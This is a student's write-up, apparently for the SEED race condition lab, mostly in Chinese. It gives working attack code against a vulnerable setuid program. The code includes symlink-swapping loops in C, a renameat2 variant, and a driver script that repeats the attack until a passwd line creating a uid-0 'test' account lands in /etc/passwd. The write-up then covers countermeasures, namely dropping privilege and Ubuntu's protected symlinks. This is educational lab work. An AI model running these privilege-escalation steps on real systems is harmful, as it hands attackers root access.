# Race Condition

## Task 1: Choosing Our Target

## Task 2: Launching the Race Condition Attack

### Task 2.A: Simulating a Slow Machine

首先，

```shell
ln -sf /dev/null /tmp/XYZ
```



然后运行`./vulp`，输入

```shell
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

在sleep的10秒内，输入

```shell
ln -sf /etc/passwd /tmp/XYZ
```

### Task 2.B: The Real Attack


`passwd_input`

```
test:U6aMy0wojraho:0:0:test:/root:/bin/bash

```



`attack_process.c`

```c
#include <unistd.h>

int main()
{
	while(1){
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		usleep(1000);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(1000);
	}

	return 0;
}
```


`target_process.sh`

```shell
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]  
do
   ./vulp < passwd_input
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"

```

```shell
[02/08/22]seed@VM:~/.../race-condition$ ./target_process.sh 
No permission 
No permission 
No permission 
No permission 
STOP... The passwd file has been changed

```

### Task 2.C: An Improved Attack Method

Improved version of `attack_process.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
int main()
{
	unsigned int flags = RENAME_EXCHANGE;
	unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
	unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
	renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
	return 0;
}
```

## Task 3: Countermeasures

### Task 3.A: Applying the Principle of Least Privilege

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);
    seteuid(getuid());	// disable root privilege

    if (fp = fopen(fn, "a+")) {
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
        exit(1);
    }

    return 0;
}
```

攻击不再可行。

### Task 3.B: Using Ubuntu’s Built-in Scheme

不断提示`No permission`或者`Open failed: Permission denied`。

When set to “1” symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.

`/tmp`设置了sticky位，是`root`所有的目录，而`/tmp/XYZ`是`seed`所有的文件。follower的uid此时是`root`，故不允许访问。

